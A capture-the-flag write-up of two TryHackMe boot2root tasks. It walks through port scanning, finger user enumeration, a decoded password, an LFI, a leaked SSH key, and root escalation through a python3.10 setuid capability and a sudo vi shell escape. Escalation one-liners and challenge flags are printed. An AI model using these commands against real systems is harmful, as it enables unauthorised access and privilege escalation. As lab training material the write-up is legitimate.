# Industrial Intrusion Task 15 - Boot2root Chess Industry THM Writeup

- Date: June 29, 2025

-> In this writeup, we will be taking a look at TryHackMe's Industrial Intrusion CTF challenge's task 15 Chess Industry, a boot2root challenge.

-> After starting the machine, we get the IP for the target machine

- IP Address: 10.10.230.163

-> Let's begin with a nmap scan to enumerate the open ports. For this, we use the commands ```-T5``` and ```-p-``` 


```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task15]
└─$ nmap 10.10.230.163 -T5 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 13:04 +04
Warning: 10.10.230.163 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.230.163
Host is up (0.14s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
79/tcp    open     finger
80/tcp    open     http
8523/tcp  filtered unknown
24877/tcp filtered unknown
26624/tcp filtered unknown
31321/tcp filtered unknown
31573/tcp filtered unknown
32018/tcp filtered unknown
33142/tcp filtered unknown
44479/tcp filtered unknown
46481/tcp filtered unknown
48783/tcp filtered unknown
61605/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 545.03 seconds
```

-> Looks like we have open ports on ports 22, 79, and 80. We have a webserver running on port 80, so let's take a look at it. 

![](attachments/Pasted%20image%2020250629133145.png)

-> Let's run a directory enumeration using gobuster. While it was running, I did a bit of research into port 79 running finger as I haven't come across it before. 

```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task15]
└─$ gobuster dir -u http://10.10.230.163/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.163/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

-> It seems to be a dead end.

-> Turns out finger is program to find information about users in the computer. Let's try it out.


```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task15]
└─$ finger @10.10.230.163
No one logged on.
```

```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task15]
└─$ finger root@10.10.230.163
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Last login Thu Jan  1 00:00 1970 (UTC) on 
No mail.
No Plan.
```

-> Next, I tried running an auxiliary finger user enumeration module from metasploit

```
msf6 auxiliary(scanner/finger/finger_users) > run
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: _apt
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: backup
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: bin
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: daemon
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: games
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: gnats
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: irc
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: landscape
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: list
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: lp
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: lxd
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: mail
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: man
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: messagebus
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: news
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: nobody
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: pollinate
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: proxy
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: root
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: sshd
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: sync
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: sys
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: syslog
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: systemd-coredump
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: systemd-network
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: systemd-resolve
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: systemd-timesync
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: tcpdump
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: tss
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: ubuntu
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: fwupd-refresh
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: uucp
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: uuidd
[+] 10.10.230.163:79      - 10.10.230.163:79 - Found user: www-data
[+] 10.10.230.163:79      - 10.10.230.163:79 Users found: _apt, backup, bin, daemon, fwupd-refresh, games, gnats, irc, landscape, list, lp, lxd, mail, man, messagebus, news, nobody, pollinate, proxy, root, sshd, sync, sys, syslog, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tcpdump, tss, ubuntu, uucp, uuidd, www-data
[*] 10.10.230.163:79      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

-> Users ubuntu and root seem interesting but they don't give any results. Going back to the webserver, there were names mentioned such as Magnus, Fabiano, and Hikaru. These could be potential users on the system. Let's try to finger them. 

```┌──(kali㉿kali)-[~/…/THM/industrialintrustion/task15/finger-user-enum-1.0]
└─$ finger magnus@10.10.230.163
Login: magnus                           Name: 
Directory: /home/magnus                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

```                                                                                      
┌──(kali㉿kali)-[~/…/THM/industrialintrustion/task15/finger-user-enum-1.0]
└─$ finger hikaru@10.10.230.163
Login: hikaru                           Name: 
Directory: /home/hikaru                 Shell: /bin/bash
Never logged in.
No mail.
Project:
http://localhost
Plan:
Working on AI chess bot for King's Square Chess Club.
```

```┌──(kali㉿kali)-[~/…/THM/industrialintrustion/task15/finger-user-enum-1.0]
└─$ finger fabiano@10.10.230.163
Login: fabiano                          Name: 
Directory: /home/fabiano                Shell: /bin/bash
Never logged in.
No mail.
Project:
Reminders
Plan:
ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=
```

-> User fabiano had a base64 encoded text in his plan. Decoding this, we get what could only be his credentials. 

```┌──(kali㉿kali)-[~/…/THM/industrialintrustion/task15/finger-user-enum-1.0]
└─$ echo "ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=" | base64 -d
fabiano:o3jVTktarGQI07q
```

-> We can now login to ssh using these creds

```┌──(kali㉿kali)-[~/…/THM/industrialintrustion/task15/finger-user-enum-1.0]
└─$ ssh fabiano@10.10.230.163                     
The authenticity of host '10.10.230.163 (10.10.230.163)' can't be established.
ED25519 key fingerprint is SHA256:Y1G6P8uP+qxABQXcmSa56gl1bRXOGPEF8b0lz9Boejc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.230.163' (ED25519) to the list of known hosts.
fabiano@10.10.230.163's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1030-aws x86_64)

*Omitted*

fabiano@tryhackme-2204:~$ whoami
fabiano
```

-> We get the first flag, user.txt

```
fabiano@tryhackme-2204:~$ ls
user.txt
fabiano@tryhackme-2204:~$ cat user.txt
THM{bishop_to_c4_check}
```

-> Let's transfer over linpeas for further enumeration. After doing so, we run linpeas. 

![](attachments/Pasted%20image%2020250629135035.png)

-> After looking into it, this means that python3.10 is able to run with the capability of changing its user ID. This means, we could probably use this to run as root. Looking through gtfobins, I found this

![](attachments/Pasted%20image%2020250629135420.png)

-> Using this, we can escalate privileges to root. 

```
fabiano@tryhackme-2204:/tmp$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
# cat /root/root.txt
THM{check_check_check_mate}
```

-> Thus, we have found the final flag, root.txt


# Industrial Intrusion Task 16 - Boot2root Under Construction THM Writeup

- Date: June 29, 2025
- IP Address: 10.10.63.43

-> Starting off with a nmap scan

```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task16]
└─$ nmap 10.10.63.43 -sV -sC  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 14:04 +04
Nmap scan report for 10.10.63.43
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 da:c4:6b:b4:6b:fe:f3:3b:4c:4d:f3:9c:d8:4e:06:15 (ECDSA)
|_  256 93:34:ff:1e:0f:df:a0:42:66:2a:f0:b2:aa:d2:07:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Industrial Dev Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-> We have a webserver on port 80. 

![](attachments/Pasted%20image%2020250629140559.png)

-> Going through the website, it seems the pages are still under construction

![](attachments/Pasted%20image%2020250629140703.png)

-> The URL seems like it would be vulnerable to LFI. And sure enough,

![](attachments/Pasted%20image%2020250629140817.png)

-> I decided to go with a directory enumeration scan using gobuster.

```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task16]
└─$ gobuster dir -u http://10.10.63.43/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.43/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.63.43/assets/]
/keys                 (Status: 301) [Size: 309] [--> http://10.10.63.43/keys/]
/server-status        (Status: 403) [Size: 276]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

-> Under the keys directory, I found a bunch of keys but only key_09 had any contents within it. And it was an openssh private key. Awesome!

![](attachments/Pasted%20image%2020250629142655.png)

-> From /etc/passwd, we know there is a user named 'dev'. Let's try to login using this id_rsa for user 'dev'.

```┌──(kali㉿kali)-[~/Downloads/THM/industrialintrustion/task16]
└─$ ssh -i id_rsa dev@10.10.63.43
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-1030-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jun 29 10:33:45 UTC 2025

  System load:  0.03               Temperature:           -273.1 C
  Usage of /:   16.1% of 19.31GB   Processes:             116
  Memory usage: 19%                Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: 10.10.63.43

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Jun 24 16:39:49 2025 from 10.13.57.153
dev@tryhackme-2404:~$ 
```

-> And we are in! We got the first flag, user.txt

```
dev@tryhackme-2404:~$ ls
user.txt
dev@tryhackme-2404:~$ cat user.txt 
THM{nic3_j0b_You_got_it_w00tw00t}
```

-> Let's try running sudo -l

```
dev@tryhackme-2404:~$ sudo -l
Matching Defaults entries for dev on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev may run the following commands on tryhackme-2404:
    (ALL) NOPASSWD: /usr/bin/vi
```

![](attachments/Pasted%20image%2020250629143610.png)

-> Let's use this to escalate privileges

```
dev@tryhackme-2404:~$ sudo /usr/bin/vi -c ':!/bin/sh' /dev/null

# whoami
root
# cat /root/root.txt
THM{y0u_g0t_it_welldoneeeee}
```

-> With that, we found the final flag for this task!

